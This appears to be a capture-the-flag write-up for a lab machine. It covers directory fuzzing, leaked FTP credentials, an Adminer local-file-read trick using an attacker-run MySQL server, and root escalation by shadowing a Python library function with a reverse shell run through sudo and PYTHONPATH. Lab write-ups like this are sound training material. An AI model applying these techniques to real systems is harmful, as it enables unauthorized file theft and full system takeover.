# Summary
- User: directory enumeration and Adminer local file inclusion exploit
- Root: shadowing Python library function imported into a script ran by root

# Details
### User: 9f56c40369e0a554c3a966cab924df5d
- Nmap scan reveals ports 21, 22, and 80 are open
- ffuf scan reveals `robots.txt` which blocks `admin-dir` and mentions "contacts and creds" 
- `contacts.txt` and `credentials.txt` can be retrieved from `admin-dir` endpoint
    - `/admin-dir` endpoint gives 403 response code but individual files can still be fuzzed for and accessed
- use `username: ftpuser` and `password: %n?4Wz}R$tTF7` from `credentials.txt` to login to FTP server and retrieve `dump.sql` and `html.tar.gz`
    - must set FTP to `passive` mode from `binary` in order to properly retrieve files
- opening `html.tar.gz` reveals presence of a `utility-scripts` directory
- `/utility-scripts` endpoint serves an `adminer.php` file
    - filename not contained in main fuzzing list and had to be inferred from machine name
- use Adminer exploit to connect to local MySQL database and then import remote files
    - https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
    - http://itman.in/en/mysql-add-user-for-remote-access/
    - remote access to MySQL
        - change `bind-address` in `/etc/mysql/mariadb.conf.d/50-server.cnf` from `127.0.0.1` to `0.0.0.0`
        - `sudo systemctl start mysql`
        - `MariaDB [mysql]> create user 'kali'@'localhost' identified by '< password >';`
        - `MariaDB [mysql]> create user 'kali'@'%' identified by '< password >';`
        - `MariaDB [mysql]> grant all on *.* to 'kali'@'localhost';`
        - `MariaDB [mysql]> grant all on *.* to 'kali'@'%';`
        - `MariaDB [mysql]> flush privileges;`
        - ensure `iptables` allows access on port 3306
    - enter external IP address (e.g., 10.10.14.41), username, password and DB name into Adminer admin panel and connect
    - use `Create Table` functionality to create a table named `dump` with a text column
    - use `SQL Command` functionality to execute `LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE <table_name> FIELDS TERMINATED BY " "` in order to pull in `index.php` which contains waldo's password
        - previously identified as containing a password for `waldo` after opening `html.tar.gz` obtained from FTP
    - retrieve waldo's password `&<h5b~yK3F#{PaPB&dA}{H>` and login with SSH to retrieve user flag

### Root: 26dc2e3368ba1bc3dc205611ba4306c6
- running `sudo -l` and supplying waldo's password reveals the user can run the script located at `/opt/scripts/admin_tasks.sh` and set environment variables (e.g., `PYTHONHOME`)
- task 6 in `admin_tasks.sh` calls `backup.py` in the same directory which imports the `make_archive` function from the `shutil` library
- create a dummy `shutil.py` file containing a function named `make_archive` in `/tmp/gato` that executes a reverse shell command to shadow the function called in `backup.py`
- trigger the shadowed function as root with `sudo PYTHONPATH=/tmp/gato /opt/scripts/admin_tasks.sh` to obtain root shell
